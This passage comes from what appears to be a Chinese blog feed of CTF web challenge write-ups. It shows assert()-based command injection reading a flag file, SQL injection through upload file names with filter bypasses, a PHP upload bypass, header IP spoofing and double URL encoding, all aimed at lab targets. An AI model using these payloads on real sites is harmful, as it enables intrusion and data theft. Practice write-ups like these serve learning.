class="type">FALSE</span> 会被转换成空字符串。</span><br><span class="line">断言这个功能应该只被用来调试。 你应该用于完整性检查时测试条件是否始终应该为 <span class="type">TRUE</span>，来指示某些程序错误，或者检查具体功能的存在（类似扩展函数或特定的系统限制和功能）。</span><br><span class="line">*/</span><br></pre></td></tr></table></figure><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">die() 函数输出一条消息，并退出当前脚本；</span><br><span class="line">strpos(<span class="keyword">string</span>,find,<span class="literal">start</span>)查找find在字符串<span class="keyword">string</span>中第一次出现的位置;</span><br><span class="line">file_exists() 函数检查文件或目录是否存在。如果指定的文件或目录存在则返回 <span class="literal">TRUE</span>，否则返回 <span class="literal">FALSE</span>。</span><br></pre></td></tr></table></figure><p>**<br>如此这般，可以利用assert()函数执行命令，类似sql注入，在数据库中查找，构造url为page=abc’) or system(“cat templates/flag.php”);//<br>{用lww’)闭合前半部分，得到false；之后执行system();//注释掉后面的代码；</p><p><img src="https://s2.ax1x.com/2019/12/09/QdvBZj.png" alt="QdvBZj.png"></p><hr><h1 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training-WWW-Robots"></a>Training-WWW-Robots</h1><h2 id="知识点补充：-1"><a href="#知识点补充：-1" class="headerlink" title="知识点补充："></a>知识点补充：</h2><p>  robots.txt是一个协议，而不是一个命令。robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt文件告诉蜘蛛程序在服务器上什么文件是可以被查看的。<br>  当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。百度官方建议，仅当您的网站包含不希望被搜索引擎收录的内容时，才需要使用robots.txt文件。如果您希望搜索引擎收录网站上所有内容，请勿建立robots.txt文件。<br>  如果将网站视为酒店里的一个房间，robots.txt就是主人在房间门口悬挂的“请勿打扰”或“欢迎打扫”的提示牌。这个文件告诉来访的搜索引擎哪些房间可以进入和参观，哪些房间因为存放贵重物品，或可能涉及住户及访客的隐私而不对搜索引擎开放。但robots.txt不是命令，也不是防火墙，如同守门人无法阻止窃贼等恶意闯入者。<br>  Robots协议用来告知搜索引擎哪些页面能被抓取，哪些页面不能被抓取；可以屏蔽一些网站中比较大的文件，如：图片，音乐，视频等，节省服务器带宽；可以屏蔽站点的一些死链接。方便搜索引擎抓取网站内容；设置网站地图连接，方便引导蜘蛛爬取页面。(摘自百度百科)</p><h2 id="实际操作：-14"><a href="#实际操作：-14" class="headerlink" title="实际操作："></a>实际操作：</h2><ul><li>访问robots.txt，发现不允许访问fl0g.php</li></ul><p><img src="https://s2.ax1x.com/2019/12/09/QdzbrD.png" alt="QdzbrD.png"></p><ul><li>尝试访问/fl0g.php，得到flag；</li></ul><p><img src="https://s2.ax1x.com/2019/12/09/Qdzqqe.png" alt="Qdzqqe.png"></p><hr><h1 id="NaNNaNNaNNaN-Batman"><a href="#NaNNaNNaNNaN-Batman" class="headerlink" title="NaNNaNNaNNaN-Batman"></a>NaNNaNNaNNaN-Batman</h1><h2 id="题目分析：-3"><a href="#题目分析：-3" class="headerlink" title="题目分析："></a>题目分析：</h2><p>下载附件，得到web100的文本，打开是乱码，大概看了下，将后缀改为HTML，在浏览器里打开，得到一个OK输入框；</p><p><img src="https://s2.ax1x.com/2019/12/09/Qdz3Ct.png" alt="Qdz3Ct.png"></p><p>但是输入没有任何响应；回头再看看代码；</p><p><img src="https://s2.ax1x.com/2019/12/09/QdzGgf.png" alt="QdzGgf.png"></p><p>  可以很明显看到,’<em>’是一个变量，而它的内容就是后面一长串字符(三行绿色部分即’’中间部分)；最后eval(</em>)函数执行_;</p><p>**<br>eval() 函数可计算某个字符串，并执行其中的的 JavaScript 代码。<br>**<br>此处，eval()并未执行$()函数，而是执行了字符串，导致乱码?:).<br>为了能看到正常源码，将eval()改为alert()；</p><p>**<br>alert() 方法用于显示带有一条指定消息和一个 OK 按钮的警告框。<br>alert是HTML DOM 中用到的一种脚本语言，它的中文意思是“提醒”。它是JavaScript或VBscript脚本语言中窗口window对象的一个常用方法；其主要用法就是在你自己定义了一定的函数以后，通过执行相应的操作，所弹出对话框的语言。并且alert对话框通常用于一些对用户的提示信息。<br>| alert(message) |                                                            |<br>| :————: | :——————————————————–: |<br>|      参数      |                            描述                            |<br>|    message     | 要在 window 上弹出的对话框中显示的纯文本（而非 HTML 文本） |<br>**</p><p><img src="https://s2.ax1x.com/2019/12/09/Qdzl4I.png" alt="Qdzl4I.png"></p><p>即：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">$</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> e=<span class="built_in">document</span>.getElementById(<span class="string">"c"</span>).value;</span><br><span class="line">    <span class="keyword">if</span>(e.length==<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">if</span>(e.match(<span class="regexp">/^be0f23/</span>)!=<span class="literal">null</span>)</span><br><span class="line">    <span class="keyword">if</span>(e.match(<span class="regexp">/233ac/</span>)!=<span class="literal">null</span>)</span><br><span class="line">    <span class="keyword">if</span>(e.match(<span class="regexp">/e98aa$/</span>)!=<span class="literal">null</span>)</span><br><span class="line">    <span class="keyword">if</span>(e.match(<span class="regexp">/c7be9/</span>)!=<span class="literal">null</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    <span class="keyword">var</span> t=[<span class="string">"fl"</span>,<span class="string">"s_a"</span>,<span class="string">"i"</span>,<span class="string">"e&#125;"</span>];</span><br><span class="line">    <span class="keyword">var</span> n=[<span class="string">"a"</span>,<span class="string">"_h0l"</span>,<span class="string">"n"</span>];</span><br><span class="line">    <span class="keyword">var</span> r=[<span class="string">"g&#123;"</span>,<span class="string">"e"</span>,<span class="string">"_0"</span>];</span><br><span class="line">    <span class="keyword">var</span> i=[<span class="string">"it'"</span>,<span class="string">"_"</span>,<span class="string">"n"</span>];</span><br><span class="line">    <span class="keyword">var</span> s=[t,n,r,i];</span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">var</span> o=<span class="number">0</span>;o&lt;<span class="number">13</span>;++o)</span><br><span class="line">    &#123;  </span><br><span class="line">      <span class="built_in">document</span>.write(s[o%<span class="number">4</span>][<span class="number">0</span>]);</span><br><span class="line">s[o%<span class="number">4</span>].splice(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">    &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="built_in">document</span>.write(<span class="string">'&lt;input id="c"&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;'</span>);</span><br><span class="line">    <span class="keyword">delete</span> _</span><br></pre></td></tr></table></figure><p>**<br>match() 方法可在字符串内检索指定的值，或找到一个或多个正则表达式的匹配。<br>splice() 方法向/从数组中添加/删除项目，然后返回被删除的项目。(应该是从var后的几个值中挑选几个，组合得到flag)<br>**</p><h2 id="实际操作：-15"><a href="#实际操作：-15" class="headerlink" title="实际操作："></a>实际操作：</h2><ul><li><p>方法一：审计，变量e需要满足五个条件。长度为16；^表示开头一定要匹配到be0f23，$表示结尾一定要匹配到e98aa,其它的只要匹配到就行，没有位置要求；所以可以构造出：e==be0f233ac7be98aa<br>在OK输入框中输入可以得到flag；</p></li><li><p>方法二：由于程序已经固定只是在输入时需要检测是否匹配，那么可以直接省去输入匹配部分，<br>直接执行关键组合flag部分；提取如下代码，在控制台执行：</p></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">$</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> e=<span class="built_in">document</span>.getElementById(<span class="string">"c"</span>).value;</span><br><span class="line">   &#123;</span><br><span class="line">    <span class="keyword">var</span> t=[<span class="string">"fl"</span>,<span class="string">"s_a"</span>,<span class="string">"i"</span>,<span class="string">"e&#125;"</span>];</span><br><span class="line">    <span class="keyword">var</span> n=[<span class="string">"a"</span>,<span class="string">"_h0l"</span>,<span class="string">"n"</span>];</span><br><span class="line">    <span class="keyword">var</span> r=[<span class="string">"g&#123;"</span>,<span class="string">"e"</span>,<span class="string">"_0"</span>];</span><br><span class="line">    <span class="keyword">var</span> i=[<span class="string">"it'"</span>,<span class="string">"_"</span>,<span class="string">"n"</span>];</span><br><span class="line">    <span class="keyword">var</span> s=[t,n,r,i];</span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">var</span> o=<span class="number">0</span>;o&lt;<span class="number">13</span>;++o)</span><br><span class="line">    &#123;  </span><br><span class="line">      <span class="built_in">document</span>.write(s[o%<span class="number">4</span>][<span class="number">0</span>]);</span><br><span class="line">s[o%<span class="number">4</span>].splice(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">    &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="built_in">document</span>.write(<span class="string">'&lt;input id="c"&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;'</span>);</span><br><span class="line">    <span class="keyword">delete</span> _</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/12/09/QdzJv8.png" alt="QdzJv8.png"></p><hr><h1 id="bug"><a href="#bug" class="headerlink" title="bug"></a>bug</h1><h2 id="题目分析：-4"><a href="#题目分析：-4" class="headerlink" title="题目分析："></a>题目分析：</h2><p>给出一个登录页面;首先随便注册一个用户；</p><p><img src="https://s2.ax1x.com/2019/12/09/Qd5WsP.png" alt="Qd5WsP.png"></p><p>登录；<br><img src="https://s2.ax1x.com/2019/12/09/QdI9JJ.png" alt="QdI9JJ.png"></p><p>发现只有Manage是不能普通用户使用的；</p><p><img src="https://s2.ax1x.com/2019/12/09/QdIAL6.png" alt="QdIAL6.png"></p><p>最后发现还有个Finpwd，找回密码之前应该会验证身份，应该是突破口；</p><h2 id="实际操作：-16"><a href="#实际操作：-16" class="headerlink" title="实际操作："></a>实际操作：</h2><p>先以smtsec找回密码，发现直接给了一个newpwd输入框；应该是需要抓包修改用户身份；</p><p><img src="https://s2.ax1x.com/2019/12/09/QdIZdO.png" alt="QdIZdO.png"></p><p>修改为admin，提示修改成功；</p><p><img src="https://s2.ax1x.com/2019/12/09/QdIeoD.png" alt="QdIeoD.png"></p><p>以admin身份登录成功；<br>但是Manage还是不能使用提示IP not allowed!<br>应该要改为本地登录；在请求头中加入X-Forwarded-For: 127.0.0.1进行ip伪造；得到如下页面；</p><p><img src="https://s2.ax1x.com/2019/12/09/QdIuJH.png" alt="QdIuJH.png"></p><p>查看源码，看到提示：</p><p><img src="https://s2.ax1x.com/2019/12/09/QdIFQ1.png" alt="QdIFQ1.png"></p><p>看到filemanage想到可能do为upload(文件管理无非上传、下载、查看、删除)；</p><p>关于文件上传：<a href="https://blog.csdn.net/qq_42636435/article/details/88096844" target="_blank" rel="noopener">https://blog.csdn.net/qq_42636435/article/details/88096844</a></p><p><img src="https://s2.ax1x.com/2019/12/09/QdIPzR.png" alt="QdIPzR.png"></p><p>根据提示Just image？因该是上传image然后改后缀；</p><p>构造： </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;？php</span><br><span class="line">    phpinfo();</span><br><span class="line">？&gt;</span><br></pre></td></tr></table></figure><p>上传发现，过滤了<?php?>;<br>不是php文件又不能进行解析得到响应；<br>非php文件下提示要上传php文件；<br>It is not a really php file<br>这里尝试使用php的脚本表达形式</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">'php'</span>&gt;</span><br><span class="line">phpinfo();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/12/09/QdIksx.png" alt="QdIksx.png"></p><p>将jpg后缀改为php4/php5;(否则不能解析)就得到响应flag了.</p><hr><h1 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h1><h2 id="初探"><a href="#初探" class="headerlink" title="初探"></a>初探</h2><p>  根据题目upload猜测可能为文件上传漏洞，先注册为会员(username:111111;password:111111);</p><p>登录就出现了上传文件的页面如下：</p><p><img src="https://s2.ax1x.com/2019/12/16/QhshQS.png" alt="QhshQS.png"></p><p>尝试上传文件，发现只有jpg格式的文件可以上传<br>尝试上传php.jpg</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>burpsuite抓包改后缀名为php得到结果回应为文件格式错误，应该是服务器端的检查，而非客户端Js过滤；</p><h2 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h2><p><strong>题目限制了上传文件的后缀名必须为jpg，但并没有对文件内容有所检查；</strong><br><strong>图片马的方法不可行，上传成功后并没有目录，同时无法上传.htaccess对图片马解析；</strong></p><p>参阅相关资料发现似乎是利用文件名注入，并且通过每次上传成功后的回显uid is ：1660 大概能够猜测应该是利用文件名对后端数据库进行注入；<br>*后端插入语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> 表名</span><br><span class="line"><span class="keyword">VALUES</span>（被插入新行中的值）</span><br></pre></td></tr></table></figure><h2 id="实际操作：-17"><a href="#实际操作：-17" class="headerlink" title="实际操作："></a>实际操作：</h2><ul><li>构造payload：（文件名）<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'+(<span class="keyword">select</span> <span class="keyword">database</span>())+<span class="string">'.jpg</span></span><br></pre></td></tr></table></figure></li></ul><p>可以看到select被过滤了，尝试双写绕过：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'+(selselectect database())+'.jpg</span><br></pre></td></tr></table></figure><p>页面回显均为0；</p><ul><li>尝试转换格式：<br>转为16进制：<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'+(selselectect hex(database()))+'.jpg</span><br></pre></td></tr></table></figure></li></ul><p>页面回显为：7765625</p><ul><li>分析(回显16进制为纯数字，可能过滤字母；且可能回显位不全)<br>转10进制输出:<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'+(selselectect conv(hex(database()),<span class="number">16</span>,<span class="number">10</span>))+'.jpg</span><br></pre></td></tr></table></figure></li></ul><p>*MySQL CONV（）将一个数字从一个数字基数系统转换为另一个数字基数系统。转换后，函数返回数字的字符串表示形式。<br>当定义的参数为NULL时，返回值将为NULL。<br>最小基数为2，最大基数为36.如果要转换的基数为负数，则该数字被视为带符号数。否则，它被视为未签名。<br>该函数出现在MySQL版本：<br>5.6语法：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="constructor">CONV(N,<span class="params">from_base</span>,<span class="params">to_base</span>)</span></span><br></pre></td></tr></table></figure><p>页面回显为：1.8446744073709552e19</p><ul><li>分析(回显科学计数法，应该是输出位数过长)<br>使用substr分割输出：<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'+(selselectect conv(substr(hex(database()),<span class="number">1</span>,<span class="number">12</span>),<span class="number">16</span>,<span class="number">10</span>))+'.jpg</span><br></pre></td></tr></table></figure></li></ul><p>页面回显为：131277325825392</p><ul><li>转16进制再转为ascll,<br>得到：web_up<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changeascll</span><span class="params">(number)</span>:</span></span><br><span class="line">    number=str(hex(number))[<span class="number">2</span>:]</span><br><span class="line">    s1=[number[i:(i+<span class="number">2</span>)]<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(number),<span class="number">2</span>)]</span><br><span class="line">    s2=[int(i,<span class="number">16</span>)<span class="keyword">for</span> i <span class="keyword">in</span> s1]</span><br><span class="line">    s3=[chr(i)<span class="keyword">for</span> i <span class="keyword">in</span> s2]</span><br><span class="line">    s=<span class="string">""</span>.join(s3)</span><br><span class="line">    print(s)</span><br><span class="line"></span><br><span class="line">changeascll(<span class="number">131277325825392</span>)</span><br></pre></td></tr></table></figure></li></ul><p>提取后半部分字符：1819238756</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'+(selselectect conv(substr(hex(database()),<span class="number">13</span>,<span class="number">12</span>),<span class="number">16</span>,<span class="number">10</span>))+'.jpg</span><br></pre></td></tr></table></figure><p>得到数据库名：web_upload</p><ul><li>同样使用上述方法爆表<br>payload：<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'+(selecselectt conv(substr(hex((selecselectt table_name frofromm information_schema.tables where table_schema='web_upload' limit <span class="number">1</span>,<span class="number">1</span>)),<span class="number">1</span>,<span class="number">12</span>),<span class="number">16</span>,<span class="number">10</span>))+'.jpg</span><br></pre></td></tr></table></figure></li></ul><p>114784820031327<br>112615676665705<br>126853610566245<br>得到表名：hello_flag_is_here</p><ul><li>爆字段<br>payload:<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'+(selecselectt conv(substr(hex((selecselectt column_name frofromm information_schema.columns where table_name='</span>hello_flag_is_her<span class="string">e' limit 0,1)),1,12),16,10))+'</span>.jpg</span><br></pre></td></tr></table></figure></li></ul><p>115858377367398<br>7102823<br>得到字段名：i_am_flag</p><ul><li>爆值<br>payload：<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'+(selecselectt conv(substr(hex((selecselectt i_am_flag frofromm hello_flag_is_here limit <span class="number">0</span>,<span class="number">1</span>)),<span class="number">1</span>,<span class="number">12</span>),<span class="number">16</span>,<span class="number">10</span>))+'.jpg</span><br></pre></td></tr></table></figure></li></ul><p>36427215695199<br>92806431727430<br>560750951</p><ul><li>得到值：<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!!_@<span class="keyword">m_Th</span>.<span class="keyword">e_F</span>!<span class="keyword">lag</span></span><br></pre></td></tr></table></figure></li></ul><hr><h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><h2 id="题目分析：-5"><a href="#题目分析：-5" class="headerlink" title="题目分析："></a>题目分析：</h2><p>根据题目要求需要解密；</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$miwen=<span class="string">"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    $_o=strrev($str);</span><br><span class="line"><span class="comment">//strrev() 函数反转字符串;语法:strrev(string)</span></span><br><span class="line">    <span class="comment">// echo $_o;</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span>($_0=<span class="number">0</span>;$_0&lt;strlen($_o);$_0++)&#123;</span><br><span class="line">       </span><br><span class="line">        $_c=substr($_o,$_0,<span class="number">1</span>);<span class="comment">//从$_0位置开始，返回1个字符</span></span><br><span class="line"><span class="comment">//substr() 函数返回字符串的一部分。</span></span><br><span class="line"><span class="comment">//注释：如果 start 参数是负数且 length 小于或等于 start，则 length 为 0。语法substr(string,start,length)</span></span><br><span class="line"><span class="comment">//用于提取字符串的一部分，即返回字符串的子串。</span></span><br><span class="line">        $__=ord($_c)+<span class="number">1</span>;</span><br><span class="line"><span class="comment">//ord() 函数返回字符串的首个字符的 ASCII 值。</span></span><br><span class="line">        $_c=chr($__);</span><br><span class="line"><span class="comment">//chr() 函数从指定的 ASCII 值返回字符。</span></span><br><span class="line"><span class="comment">//ASCII 值可被指定为十进制值、八进制值或十六进制值。八进制值被定义为带前置 0，而十六进制值被定义为带前置 0x。</span></span><br><span class="line">        $_=$_.$_c;<span class="comment">//拼接   </span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> str_rot13(strrev(base64_encode($_)));</span><br><span class="line"><span class="comment">//返回ROT13 编码(反转字符串(base64加密($_)))的结果</span></span><br><span class="line"><span class="comment">//ROT13一种简易的替换式密码</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   逆向加密算法，解密$miwen就是flag</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="实际操作：-18"><a href="#实际操作：-18" class="headerlink" title="实际操作："></a>实际操作：</h2><p>分析代码，可知加密流程为：</p><ul><li>对flag字符串反转</li><li>截取每一个字符，转ascll+1,再转为字符，拼接</li><li>base64加密，反转加密和的字符串，ROT13编码<br>则可得解密算法：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$str=<span class="string">'a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws'</span>;</span><br><span class="line">$_ = base64_decode(strrev(str_rot13($str)));</span><br><span class="line">$_o=<span class="keyword">NULL</span>;</span><br><span class="line"><span class="keyword">for</span>($_0=<span class="number">0</span>;$_0&lt;strlen($_);$_0++)&#123;  </span><br><span class="line">       </span><br><span class="line">        $_c=substr($_,$_0,<span class="number">1</span>);  </span><br><span class="line"></span><br><span class="line">        $__=ord($_c)<span class="number">-1</span>;  </span><br><span class="line"></span><br><span class="line">        $_c=chr($__);  </span><br><span class="line"></span><br><span class="line">        $_o=$_o.$_c;   </span><br><span class="line">    &#125; </span><br><span class="line"><span class="keyword">echo</span> strrev($_o);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><p><img src="https://s2.ax1x.com/2019/12/21/QjMzkR.png" alt="QjMzkR.png"></p><hr><h1 id="php2"><a href="#php2" class="headerlink" title="php2"></a>php2</h1><h2 id="题目分析：-6"><a href="#题目分析：-6" class="headerlink" title="题目分析："></a>题目分析：</h2><p>打开链接只有一句：<br><strong>Can you anthenticate to this website?</strong><br>尝试访问index.php，失败；访问index.phps,成功；<br>得到以下源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">"admin"</span>===$_GET[id]) &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;not allowed!&lt;/p&gt;"</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_GET[id] = urldecode($_GET[id]);</span><br><span class="line"><span class="keyword">if</span>($_GET[id] == <span class="string">"admin"</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Access granted!&lt;/p&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Key: xxxxxxx &lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析代码：</p><ul><li><p>要使”admin”===$_GET[id]不成立</p></li><li><p>$_GET[id] = urldecode($_GET[id]);<br>url编码后使得$_GET[id] == “admin”成立</p></li></ul><h2 id="实际操作：-19"><a href="#实际操作：-19" class="headerlink" title="实际操作："></a>实际操作：</h2><p>方案：通过url转码实现，因为浏览器要转一次，故我们进行二次转码；<br>n的url编码为：%6e;%的url编码为%25<br>构造：admi%256e</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//111.198.29.45:35463/?id=admi%256e</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/12/21/Qj84JA.png" alt="Qj84JA.png"></p><hr>]]></content>
    
    <summary type="html">
    
      
      
        &lt;center&gt;目录&lt;/center&gt;
[TOC]

&lt;h1 id=&quot;攻防世界&quot;&gt;&lt;a href=&quot;#攻防世界&quot; class=&quot;headerlink&quot; title=&quot;攻防世界&quot;&gt;&lt;/a&gt;攻防世界&lt;/h1&gt;&lt;h1 id=&quot;新手练习区&quot;&gt;&lt;a href=&quot;#新手练习区&quot; class=
      
    
    </summary>
    
      <category term="CTF" scheme="https://singlemindedt.github.io/categories/CTF/"/>
    
      <category term="攻防世界" scheme="https://singlemindedt.github.io/categories/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
    
      <category term="Web" scheme="https://singlemindedt.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>RSA算法分析</title>
    <link href="https://singlemindedt.github.io/2019/12/24/RSA%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90/"/>
    <id>https://singlemindedt.github.io/2019/12/24/RSA算法分析/</id>
    <published>2019-12-24T08:49:29.000Z</published>
    <updated>2019-12-24T09:17:40.535Z</updated>
    
    <content type="html"><![CDATA[<h1 id="快速幂算法"><a href="#快速幂算法" class="headerlink" title="快速幂算法"></a>快速幂算法</h1><p> 加解密都用到了幂运算<br> <figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">def</span> <span class="string">FastMod(x, n, m):</span></span><br><span class="line">   <span class="attr">a</span> = <span class="string">1</span></span><br><span class="line">   <span class="attr">b</span> = <span class="string">x</span></span><br><span class="line">   <span class="attr">while</span> <span class="string">True:</span></span><br><span class="line">       <span class="attr">temp</span> = <span class="string">n</span></span><br><span class="line">       <span class="attr">if</span> <span class="string">n % 2 == 1 :</span></span><br><span class="line">           <span class="attr">a</span> = <span class="string">a * b % m</span></span><br><span class="line">       <span class="attr">b</span> = <span class="string">b * b % m</span></span><br><span class="line">       <span class="attr">n</span> = <span class="string">n//2</span></span><br><span class="line">       <span class="attr">if</span> <span class="string">temp &lt; 1 :</span></span><br><span class="line">           <span 